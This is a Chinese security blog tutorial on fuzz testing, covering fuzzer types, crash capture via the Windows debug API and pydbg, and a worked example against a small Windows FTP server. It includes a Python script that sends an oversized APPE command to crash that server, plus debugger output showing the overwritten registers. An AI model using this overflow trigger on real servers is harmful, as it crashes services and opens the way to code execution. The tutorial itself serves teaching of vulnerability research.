<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1,width=device-width">
    <title>提起模糊测试时我们在说什么 | MottoIN</title>
    <link rel='dns-prefetch' href='//www.mottoin.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="MottoIN &raquo; 提起模糊测试时我们在说什么评论Feed" href="http://www.mottoin.com/87985.html/feed" />
<link rel='stylesheet' id='stylesheet-css'  href='http://www.mottoin.com/wp-content/themes/JustNews/css/style.css?ver=2.3.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpcom-qa-css'  href='http://www.mottoin.com/wp-content/plugins/wpcom-qa/css/style.css?ver=1.0' type='text/css' media='all' />
<style id='wpcom-qa-inline-css' type='text/css'>

        .q-content .topic-tab,.q-content .q-answer .as-user,.q-content .q-answer .as-comment-name{color: #1471CA;}
        .q-content .q-topic-wrap a:hover,.q-content .q-answer .as-action a:hover,.q-content .topic-tab:hover{color:#0D62B3;}
        .q-content .put-top,.q-content .topic-tab.current-tab,.q-content .q-answer .as-submit .btn-submit,.q-content .q-answer .as-comments-submit,.q-content .q-add-header .btn-post,.q-content .q-pagination .current{background-color:#1471CA;}
        .q-content .q-answer .as-submit .btn-submit:hover,.q-content .q-answer .as-comments-submit:hover,.q-content .q-add-header .btn-post:hover,.q-content .topic-tab.current-tab:hover,.q-content .q-pagination a:hover{background-color:#0D62B3;}
        .q-content .q-answer .as-comments-input:focus{border-color: #1471CA;}
        
</style>
<link rel='stylesheet' id='um_minified-css'  href='http://www.mottoin.com/wp-content/plugins/ultimate-member/assets/css/um.min.css?ver=10.3.88' type='text/css' media='all' />
<script type='text/javascript' src='http://www.mottoin.com/wp-content/themes/JustNews/js/jquery.min.js?ver=1.12.4'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.mottoin.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.mottoin.com/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='Metasploit如何派生一个shell给cobaltstrike' href='http://www.mottoin.com/87977.html' />
<link rel='next' title='谷歌Play商店发现恶意QuadRooter应用' href='http://www.mottoin.com/88005.html' />
<link rel='shortlink' href='http://www.mottoin.com/?p=87985' />
<!--  WPCOM主题相关信息开始 -->
<meta name="applicable-device" content="pc,mobile">
<meta http-equiv="Cache-Control" content="no-transform">
<meta name="keywords" content="exp,Fuzz,python灰帽子,shellcode,WSARecv,安全漏洞,模糊测试">
<meta name="description" content="0x00基础知识一:区分我们常说的漏洞挖掘,大致可以分为两种模式:白盒、黑盒.1.白盒,又称透明盒测试,指我们清楚的了解程序的逻辑,获得设计思路,说明文档,源代码的情况下进行的测试.优点:准确率高,定位到可能存在的漏洞位置处,能清楚的看到前后逻辑.缺点:过于复杂,在代码量巨大的情况下,手工寻找要付出相当的精力,网传winNt4.0泄露过源码,但并未出现因该次泄露而导致的漏洞.2.黑盒,又称功能测试">
<!--  WPCOM主题相关信息结束 -->
 
		<script type="text/javascript">

		var ultimatemember_image_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-image-upload.php';
		var ultimatemember_file_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-file-upload.php';
		var ultimatemember_ajax_url = 'http://www.mottoin.com/wp-admin/admin-ajax.php';

		</script>

	
		<style type="text/css">.request_name { display: none !important; }</style>

	<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-32x32.jpg" sizes="32x32" />
<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-192x192.jpg" sizes="192x192" />
<link rel="apple-touch-icon-precomposed" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-180x180.jpg" />
<meta name="msapplication-TileImage" content="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-270x270.jpg" />
    <style>
                a,.sec-panel-head span,.list.tabs .tab.active a,.header .nav>li.active>a,.header .dropdown-menu>.active>a,.entry .entry-info .nickname,.entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.comment-body .nickname,.form-submit-text span,.widget_profile .author-title,.um .um-profile-body .um-item-meta a,.login-modal-body .btn-register{color: #08c;}
        .header .dropdown-menu>li>a:hover,.header .dropdown-menu>.active>a:hover,.header .dropdown-menu>.active>a:focus,.navbar-action .publish,.pagination .current,.flex-control-paging li a.flex-active,.form-submit .submit,.sidebar .widget_nav_menu ul li.current-menu-item a,.sidebar .widget_nav_menu ul li.current-post-parent a,.search-form input.submit,.action .contact-title,.pf-submit,.tagHandler ul.tagHandlerContainer li.tagItem,.login-modal-body .btn-login,.woocommerce a.button,.woocommerce button.button,.woocommerce input.button,.woocommerce a.button.alt,.woocommerce button.button.alt,.woocommerce input.button.alt,.woocommerce a.button.alt.disabled,.woocommerce a.button.alt.disabled:hover,.woocommerce a.button.alt:disabled,.woocommerce a.button.alt:disabled:hover,.woocommerce a.button.alt:disabled[disabled],.woocommerce a.button.alt:disabled[disabled]:hover,.woocommerce button.button.alt.disabled,.woocommerce button.button.alt.disabled:hover,.woocommerce button.button.alt:disabled,.woocommerce button.button.alt:disabled:hover,.woocommerce button.button.alt:disabled[disabled],.woocommerce button.button.alt:disabled[disabled]:hover,.woocommerce input.button.alt.disabled,.woocommerce input.button.alt.disabled:hover,.woocommerce input.button.alt:disabled,.woocommerce input.button.alt:disabled:hover,.woocommerce input.button.alt:disabled[disabled],.woocommerce input.button.alt:disabled[disabled]:hover,.woocommerce .widget_price_filter .ui-slider .ui-slider-handle,.woocommerce .widget_price_filter .ui-slider .ui-slider-range,.shopping-count,.social-login-form .sl-input-submit{background-color: #08c;}
        .entry .entry-content h3,.entry .entry-content .h3,.widget-title{border-left-color: #08c;}
        .entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.search-form input.keyword:focus,.widget_profile .author-title,.login-modal-body .btn-login,.login-modal-body .btn-register{border-color: #08c;}
        .entry-bar-inner .author-title:before,.widget_profile .author-title:before{border-right-color: #08c;}
        .list.tabs .tab.active a{border-bottom-color: #08c;}

        a:hover,.header .nav>li>a:hover,.header .nav>li.active>a,.navbar-action .login:hover,.navbar-action .login:focus,.navbar-action .profile a:hover,.navbar-search-icon:hover,.navbar-search-icon:focus,.entry .entry-info a:hover,.entry .entry-info a:focus,.entry-bar .info-item a:hover,.p-item-wrap:hover .title a,.special-item-title a:hover,.special-item-bottom a:hover,.widget ul a:hover,.widget ol a:hover,.sec-panel-head .more:hover,.topic-list .topic-wrap:hover span,.tabs .tab a:hover,
        .article-list .item-title a:hover,.article-list .item-meta a:hover,.article-list .item-meta a:focus,.list-links a:hover,.list-links a:focus,.um .um-profile-body .um-item-meta a:hover,.um .um-profile-body .um-item-link a:hover,.load-more:hover,.login-modal-body .btn-register:hover{color: #07c;}
        .navbar-action .publish:hover,.navbar-action .publish:focus,.entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.pagination a:hover,.flex-control-paging li a:hover,.form-submit .submit:hover,.widget .tagcloud a:hover,.sidebar .widget_nav_menu ul li.current-menu-item .sub-menu a:hover,.sidebar .widget_nav_menu ul li.current-post-parent .sub-menu a:hover,.sidebar .widget_nav_menu ul li a:hover,.search-form input.submit:hover,.action .a-box:hover,.footer-sns .fa:after,.article-list .item-category:hover,.pf-submit:hover,.tagHandler ul.tagHandlerContainer li.tagItem:hover,.login-modal-body .btn-login:hover,.woocommerce a.button:hover,.woocommerce button.button:hover,.woocommerce input.button:hover,.woocommerce a.button.alt:hover,.woocommerce button.button.alt:hover,.woocommerce input.button.alt:hover,.woocommerce .widget_price_filter .price_slider_wrapper .ui-widget-content,.social-login-form .sl-input-submit:hover{background-color: #07c;}
        .entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.widget .tagcloud a:hover,.load-more:hover,.login-modal-body .btn-login:hover,.login-modal-body .btn-register:hover{border-color: #07c;}
        .special-item-bottom a:hover:before{border-left-color: #07c;}
        .list.tabs .tab.active a:hover{border-bottom-color: #07c;}
        @media (max-width: 991px){
            .header .navbar-nav>li.active>a,.header .navbar-nav .dropdown-menu .active a,.header .navbar-nav .dropdown-menu .active .dropdown-menu .active a{color: #08c;}
            .navbar-collapse{background-color: #08c;}
            .dropdown-menu>li a{border-color: #07c;}
            .header .navbar-nav>li.active>a:hover,.header .navbar-nav>li a:hover,.header .navbar-nav .dropdown-menu .active a:hover,.header .navbar-nav .dropdown-menu .active .dropdown-menu a:hover,.header .navbar-nav .dropdown-menu li a:hover{color: #07c;}
        }
        .j-share{position: fixed!important;top: 50%!important;}
                .header .logo img{max-height: 32px;}
                @media (max-width: 767px){
            .header .logo img{max-height: 26px;}
        }
                        .btn-post{
    display: block;
    margin: 0 auto;
    padding: 15px 20px;
    font-size: 16px;
    text-align: center;
    color: #fff !important;
    line-height: 1;
    background: #1471CA;
    -webkit-border-radius: 3px;
    border-radius: 3px;
    text-decoration: none;
    border: 0;
    outline: 0;
}    </style>
    <script> (function() {if (!/*@cc_on!@*/0) return;var e = "abbr, article, aside, audio, canvas, datalist, details, dialog, eventsource, figure, footer, header, hgroup, mark, menu, meter, nav, output, progress, section, time, video".split(', ');var i= e.length; while (i--){ document.createElement(e[i]) } })()</script>
    <!--[if lte IE 8]><script src="http://www.mottoin.com/wp-content/themes/JustNews/js/respond.min.js"></script><![endif]-->
</head>
<body class="post-template-default single single-post postid-87985 single-format-standard">
<header class="header">
    <div class="container clearfix">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
                <span class="icon-bar icon-bar-1"></span>
                <span class="icon-bar icon-bar-2"></span>
                <span class="icon-bar icon-bar-3"></span>
            </button>
            <a class="logo" href="http://www.mottoin.com"><img src="http://www.mottoin.com/img/mottoin/logo.png" alt="MottoIN"></a>
        </div>
        <div class="collapse navbar-collapse">
            <nav class="navbar-left primary-menu"><ul id="menu-%e5%af%bc%e8%88%aa" class="nav navbar-nav"><li class="menu-item menu-item-home"><a href="http://www.mottoin.com/">首页</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/category/news">资讯</a></li>
<li class="menu-item current-post-ancestor dropdown"><a href="http://www.mottoin.com/category/article" class="dropdown-toggle">文章</a>
<ul role="menu" class=" dropdown-menu">
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/web">Web安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/system">系统安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/network">网络安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/terminal">终端安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/database">数据安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/wireless">无线安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/social">社会工程</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/intranet">内网渗透</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/code">代码审计</a></li>
	<li class="menu-item current-post-ancestor current-menu-parent current-post-parent"><a href="http://www.mottoin.com/category/article/reverse">逆向破解</a></li>
</ul>
</li>
<li class="menu-item"><a href="http://www.mottoin.com/category/tools">工具</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/category/geek">极客</a></li>
<li class="menu-item dropdown"><a href="http://www.mottoin.com/category/sole" class="dropdown-toggle">独家</a>
<ul role="menu" class=" dropdown-menu">
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/topic">专题</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/people">人物</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/view">观点</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/events">活动</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/video">视频</a></li>
</ul>
</li>
<li class="menu-item"><a href="http://www.mottoin.com/category/hr">招聘</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/forum">社区</a></li>
</ul></nav>            <div class="navbar-action pull-right">

                                    <form class="navbar-search" action="http://www.mottoin.com" method="get" role="search">
                        <input type="text" name="s" class="navbar-search-input" autocomplete="off" placeholder="输入关键词搜索..." value="">
                        <a class="navbar-search-icon j-navbar-search" href="javascript:;"></a>
                    </form>

                    
                    <div id="j-user-wrap">
                        <a class="login" href="http://www.mottoin.com/login">登录</a>
                        <a class="login" href="http://www.mottoin.com/register">注册</a>
                    </div>
                    <a class="publish" href="http://www.mottoin.com/post">
                        投稿</a>
                                                </div>
        </div><!-- /.navbar-collapse -->
    </div><!-- /.container -->
</header>
<div id="wrap">    <div class="main container">
        <div class="content">
                            <article id="post-87985" class="post-87985 post type-post status-publish format-standard has-post-thumbnail hentry category-reverse tag-exp tag-fuzz tag-python tag-shellcode tag-wsarecv tag-481 tag-1049">
                    <div class="entry">
                        <div class="entry-head">
                            <h1 class="entry-title">提起模糊测试时我们在说什么</h1>
                            <div class="entry-info">
                                                                <a class="nickname" href="http://www.mottoin.com/user/seceditor/">Moto</a>
                                <span class="dot">•</span>
                                <span>2016年8月24日</span>
                                <span class="dot">•</span>
                                <a href="http://www.mottoin.com/category/article/reverse" rel="category tag">逆向破解</a>                                                                    <span class="dot">•</span>
                                    <span>阅读 1271</span>
                                                            </div>
                        </div>
                                                                        <div class="entry-content clearfix">
                            <h2>0x00 基础知识</h2>
<h3>一:区分</h3>
<p>我们常说的漏洞挖掘,大致可以分为两种模式:白盒、黑盒.</p>
<p>1.白盒,又称透明盒测试,指我们清楚的了解程序的逻辑,获得设计思路,说明文档,源代码的情况下进行的测试.</p>
<ul>
<li>优点:准确率高,定位到可能存在的漏洞位置处,能清楚的看到前后逻辑.</li>
<li>缺点:过于复杂,在代码量巨大的情况下,手工寻找要付出相当的精力,网传winNt4.0泄露过源码,但并未出现因该次泄露而导致的漏洞.</li>
</ul>
<p>2.黑盒,又称功能测试,指在完全不了解内部信息的情况下进行碰撞测试</p>
<ul>
<li>优点:可用性、重现性高,完全针对功能的测试,不同于白盒,在源码中实现漏洞函数细节但并未调用的情况,编译器会优化掉这个函数,也就是这个功能并不可用.</li>
<li>缺点:高误报,捕捉异常麻烦</li>
</ul>
<h3>二:fuzz的局限性</h3>
<p>我们根据自己的经验编写相应的规则,白盒时,例如搜索gets、strcpy、fgets、memcpy等函数,然后向上回溯,如上所说,有可能函数并未调用过,亦或在上层调用之前已经做了限制,例如:</p>
<pre class="">#include &lt;string.h&gt;
void test(char *arr){
 char buffer[10];
 strcpy(buffer,arr);
}

int main(int argc,char **argv){
 if(length(argv[1])&lt;=10)
 test(argv[1]);
}</pre>
<p>在黑盒时,例如出现越权漏洞、作者自留后门、多阶漏洞,我们手工测试可以精准的判断,换成程序的视角,这就是一个正常的功能,造成误报</p>
<h2>0x01 fuzz的各阶段</h2>
<ol>
<li>确定目标</li>
<li>细化规则确定发包数据</li>
<li>发包</li>
<li>异常捕获</li>
<li>hook api定位poc</li>
</ol>
<h3>一:模糊测试器的类型</h3>
<p>常见的有命令行参数fuzz、环境变量fuzz、文件fuzz、网络协议fuzz、内存fuzz等<br />
命令行参数就是上面的代码例子,环境变量fuzz,这个就是getenv(&#8220;aaa&#8221;); 两种思路,不停的重写aaa变量的值和重启目标程序,第二点是必须的,第一点的改进思路hook getenv,重新实现一个getenv函数.</p>
<p>文件fuzz:覆盖性的写入数据,如果不读文件格式的说明文档,按字节覆盖,工作量巨大,有些文件格式会进行CRC效验,例如png文件格式.就像溢出保护的/gs选项.</p>
<p>网络协议fuzz:协议即传输数据的标准,数据本质上是01,根据协议对每个位置的划分来确定不同位置数据的意义,我们把这些位置称为块,块内的数据以key:value的方式存储,像是堆块中块首一样,有特定的位置标注数据的大小,client按协议格式发包后,server端根据协议解析,假如随意修改了数据却没有修改块大小,server端就无法正确识别数据.</p>
<p>协议也分两种:简单文本协议、二进制协议 简单协议通讯的数据在可打印字符范围内,人工可阅读,例如ftp、http协议</p>
<p><img class="alignnone size-full wp-image-87987 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/1-74.png" alt="1" width="381" height="193" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/1-74.png 381w, http://www.mottoin.com/wp-content/uploads/2016/08/1-74-300x152.png 300w" sizes="(max-width: 381px) 100vw, 381px" /></p>
<p>复杂如tcp/ip协议的NBNS,wireshark本身支持的协议比较多,或是本身公开或是逆向工程,将数据解析成肉眼可阅读的格式.</p>
<p><img class="alignnone size-full wp-image-87988 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/2-67.png" alt="2" width="956" height="499" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/2-67.png 956w, http://www.mottoin.com/wp-content/uploads/2016/08/2-67-300x157.png 300w, http://www.mottoin.com/wp-content/uploads/2016/08/2-67-768x401.png 768w" sizes="(max-width: 956px) 100vw, 956px" /></p>
<p>当面对复杂且闭源的协议,对其fuzz首要工作就是逆向工程,为此出现了内存形式的fuzz,直接在程序的内存空间里进行模糊测试</p>
<p><img class="alignnone size-full wp-image-87989 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/3-60.png" alt="3" width="627" height="230" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/3-60.png 627w, http://www.mottoin.com/wp-content/uploads/2016/08/3-60-300x110.png 300w" sizes="(max-width: 627px) 100vw, 627px" /></p>
<p>有如上代码,无限循环接受请求,在内存空间定位到parse之前插入数据而不必关心数据在recv之前是如何封装的,缺陷就是漏洞场景可能无法重现</p>
<h3>二:细化规则和发包</h3>
<p>除去内存fuzz,发包方式分两种:直接发送跟代理发送.第二种也叫启发式fuzz,wireshark可解析的情况下,针对特定字段fuzz</p>
<p>流程图如下:</p>
<p><img class="alignnone size-full wp-image-87990 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/4-57.png" alt="4" width="351" height="156" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/4-57.png 351w, http://www.mottoin.com/wp-content/uploads/2016/08/4-57-300x133.png 300w" sizes="(max-width: 351px) 100vw, 351px" /></p>
<p>本文以简单协议的ftp fuzz为例,瓶颈出现在发包过程中,要考虑server端的带宽和上游isp的响应速度,好在可以把server部署在本地.</p>
<p>以覆盖缓冲区为目的,截取不同长度的数据来发包,数据内容不能出现在用户层的内存地址, 我们喜闻乐见的栈溢出发生时会抛出内存地址读取或写入违例的异常,假如eip指向用户层内的地址可能不会抛出异常. 这里我们就用一串A来测试.</p>
<h3>三:异常捕获</h3>
<p>设想我们有一个长度为10的数组,数组内每组数据长度不同,以递增方式存储,假设第4组数据长度刚好溢出缓冲区抛出异常,模糊测试器没有异常捕获功能,直到发包完毕后才停止,那么我们只能确定测试目标存在漏洞,如何精准定位数据长度呢? 常见的捕获方式有三种:</p>
<ol>
<li>监视事件日志.</li>
<li>心跳包检测.</li>
<li>调试器</li>
</ol>
<p>大多数情况我们推荐用成熟的调试器(例如OD)attach目标程序,程序崩溃时能清楚的观察上下文,堆栈回溯定位漏洞位置,配合wireshark能清楚的看到发包数据,或者在模糊测试器内嵌异常捕获功能:</p>
<ol>
<li>CreateProcessA包含Debug_PROCESS标志来创建调试态的程序,WaitForDebugEvent获取信号,程序触发异常会发送信号给模糊测试器</li>
<li>DebugActiveProcess附加到相应进程上,同WaitForDebugEvent,再另外起线程去发包</li>
</ol>
<p>DEBUG_EVENT结构:</p>
<pre class="">typedef struct _DEBUG_EVENT {
 DWORD dwDebugEventCode;
 DWORD dwProcessId;
 DWORD dwThreadId;
 union {
 EXCEPTION_DEBUG_INFO Exception;
 CREATE_THREAD_DEBUG_INFO CreateThread;
 CREATE_PROCESS_DEBUG_INFO CreateProcessInfo;
 EXIT_THREAD_DEBUG_INFO ExitThread;
 EXIT_PROCESS_DEBUG_INFO ExitProcess;
 LOAD_DLL_DEBUG_INFO LoadDll;
 UNLOAD_DLL_DEBUG_INFO UnloadDll;
 OUTPUT_DEBUG_STRING_INFO DebugString;
 RIP_INFO RipInfo;
 } u;
} DEBUG_EVENT, 
 *LPDEBUG_EVENT;</pre>
<p>dwDebugEventCode值信息</p>
<pre class="">1u.Exception
2 u.Create Thread
3 u.CreateProcessInfo
4 u.ExitThread
5 u.ExitProcess
6 u.LoadDll
7 u.UnloadDll
8 u.DebugString
9 u.RipInfo</pre>
<p>无限循环,WaitForDebugEvent每隔100毫秒获取一次调试信号,捕捉到异常信号并处理完毕后,ContinueDebugEvent允许线程继续执行.ContinueDebugEvent DBG_CONTINUE将控制权还给进程,DBG_EXCEPTION_NOT_HANDLED相反</p>
<p>看起来实现了一个不优雅的回调</p>
<pre class="">//some code
void OnException(const EXCEPTION_DEBUG_INFO*);
BOOL waitEvent = TRUE;
DEBUG_EVENT debugEvent;
while (waitEvent == TRUE &amp;&amp; WaitForDebugEvent(&amp;debugEvent, 100)) {

switch (debugEvent.dwDebugEventCode) {
 case EXCEPTION_DEBUG_EVENT:
 OnException(&amp;debugEvent.u.Exception);
 break;

default:
 std::wcout &lt;&lt; TEXT("Unknown debug event.") &lt;&lt; std::endl;
 break;
 }
 if (waitEvent == TRUE) {
 ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
 }
 else {
 break;
 }
}
//some code</pre>
<p>每种调试事件的具体信息用u来索引,例如dwDebugEventCode值为1,那么就是u.Exception,EXCEPTION_DEBUG_INFO结构中dwFirstChange用来判断首轮异常还是末轮异常,dwFirstChange不为零,代表首轮,这意味着触发异常时程序中的异常处理器还未接管. 如下代码,假如此处strcpy发生溢出,但忽略了首轮异常,except进行了处理,我们的调试器就无法捕捉</p>
<pre class="">void test(){
 __try{
 strcpy(aaa,bbb);
 }
 __except(...){
 printf(...);
 }
}</pre>
<p>之后还有获取上下文动作、读取内存动作、栈展开等,毫无疑问要花费相当的精力,幸运的pydbg模块已经帮封装了大多数的功能. pydbg的安装网上有教程,我这里用python2.7.8 32bit正常安装 python -m pydoc pydbg或者help(pydbg)查看相关介绍.</p>
<p><img class="alignnone size-full wp-image-87993 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/5-45.png" alt="5" width="1095" height="464" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/5-45.png 1095w, http://www.mottoin.com/wp-content/uploads/2016/08/5-45-300x127.png 300w, http://www.mottoin.com/wp-content/uploads/2016/08/5-45-768x325.png 768w, http://www.mottoin.com/wp-content/uploads/2016/08/5-45-1024x434.png 1024w" sizes="(max-width: 1095px) 100vw, 1095px" /></p>
<p>测试软件用的光刃前辈之前挖掘的&#8221;守望迷你ftp服务器&#8221;漏洞,测试exp:</p>
<pre class="">import sys,socket

def main():
 ip,port,user,password=sys.argv[1:]
 shellcodeTest=['A'*500]
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 connect=s.connect((ip,int(port)))
 s.recv(4096)
 s.send('USER'+' '+str(user)+'\r\n')
 s.recv(4096)
 s.send('PASS'+' '+str(password)+'\r\n')
 s.recv(4096)
 s.send('APPE'+' '+shellcodeTest[0]+'\r\n')
 s.recv(4096)
 s.send('QUIT'+' '+'\r\n')
 s.close()

if __name__ == '__main__':
 main()</pre>
<p>先捕捉异常试一下,test code:</p>
<pre class="">#!/usr/bin/env python
# -*- coding:utf-8 -*-
from pydbg import *
from pydbg.defines import *
import utils
import sys

def accessViolationCallback(debugger):
 if debugger.dbg.u.Exception.dwFirstChance:

print debugger.disasm(debugger.context.Eip)
 #debugger.terminate_process()
 return DBG_EXCEPTION_NOT_HANDLED
 #if DBG_EXCEPTION_NOT_HANDLED then seh-&gt;veh-&gt;kill


def main():
 debugger=pydbg()
 flag=0
 targetProgramName=u'守望迷你ftp服务器.exe'

#enumerate process.filter target ftp program
 for (pid, name ) in debugger.enumerate_processes():
 if name ==targetProgramName.encode('gbk') :
 # name.encode('gbk')... windows font format.. you know...
 debugger.attach(pid)
 flag=1
 print "[*] attaching to program with pid %d " %pid

if flag==0:
 print "[*] target program not found\n"
 sys.exit(-1)
 debugger.set_callback(EXCEPTION_ACCESS_VIOLATION, accessViolationCallback)
 #raise EXCEPTION_ACCESS_VIOLATION,Callback "accessViolationCallback" func
 debugger.run()


if __name__ == '__main__':
 main()</pre>
<p>看效果:</p>
<p><img class="alignnone size-full wp-image-87995 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/6-40.png" alt="6" width="970" height="568" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/6-40.png 970w, http://www.mottoin.com/wp-content/uploads/2016/08/6-40-300x176.png 300w, http://www.mottoin.com/wp-content/uploads/2016/08/6-40-768x450.png 768w" sizes="(max-width: 970px) 100vw, 970px" /></p>
<p>上面的utils模块的功能就是记录当前线程的状态,包括异常类型、上下文、异常地址、栈展开、seh链等<br />
捕捉首轮异常的第一个异常(下一个异常覆盖eip,现在已经覆盖了seh chain),创建一个实例后,record_crash打印线程状态概要信息,terminate_process结束进程</p>
<pre class="">def crashInfo(debugger):
 crash_bin = utils.crash_binning.crash_binning()
 crash_bin.record_crash(debugger)
 return crash_bin.crash_synopsis()


def accessViolationCallback(debugger):
 if debugger.dbg.u.Exception.dwFirstChance:

print debugger.disasm(debugger.context.Eip)
 print crashInfo(debugger)
 debugger.terminate_process()
 return DBG_EXCEPTION_NOT_HANDLED
 #if DBG_EXCEPTION_NOT_HANDLED then seh-&gt;veh-&gt;kill</pre>
<p>查看效果</p>
<pre class="">[*] attaching to program with pid 476
mov [edi],edx
msvcrt.dll:77c12131 mov [edi],edx from thread 1708 caused access violati
when attempting to write to 0x00130000

CONTEXT DUMP
 EIP: 77c12131 mov [edi],edx
 EAX: 7efefefe (2130640638) -&gt; N/A
 EBX: 00000000 ( 0) -&gt; N/A
 ECX: 0012fe0c ( 1244684) -&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (stack)
 EDX: 41414141 (1094795585) -&gt; N/A
 EDI: 0012ffff ( 1245183) -&gt; Actx L| 4d[IY-2(0pSsHd,,ZZ (stack)
 ESI: 030e88b8 ( 51284152) -&gt; C:/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (heap)
 EBP: 0012dbf8 ( 1235960) -&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (stack)
 ESP: 0012d7e8 ( 1234920) -&gt; RAhfC:\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAA (stack)
 +00: 00000000 ( 0) -&gt; N/A
 +04: 00410952 ( 4262226) -&gt; uEuuPVr;uEu^^EuPuuV;Et&amp;9_ u!hQuuVujW3;t}
'+=HiujW3Et1u}VW!VhQjVuS)VsE$Eu (守望迷你ftp服务器.exe.data)
 +08: 0012d9f8 ( 1235448) -&gt; AAAC:\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (stack)
